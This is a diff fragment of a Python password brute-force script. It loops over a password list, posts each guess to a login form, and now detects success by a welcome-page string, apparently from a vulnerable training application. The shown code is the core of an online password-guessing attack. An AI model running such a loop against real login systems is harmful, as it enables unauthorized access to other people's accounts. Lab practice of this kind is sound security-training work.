@@ -27,7 +27,7 @@ for password in passwords:
     response = session.post(target_url, data=login_data)
     print(response.text) 
     # Check the response to determine if the login was successful
-    if "Username and/or password incorrect." not in response.text:
+    if "Welcome to the password protected area"  in response.text:
         print("Login successful!")
         print("Username: " + username)
         print("Password: " + password)
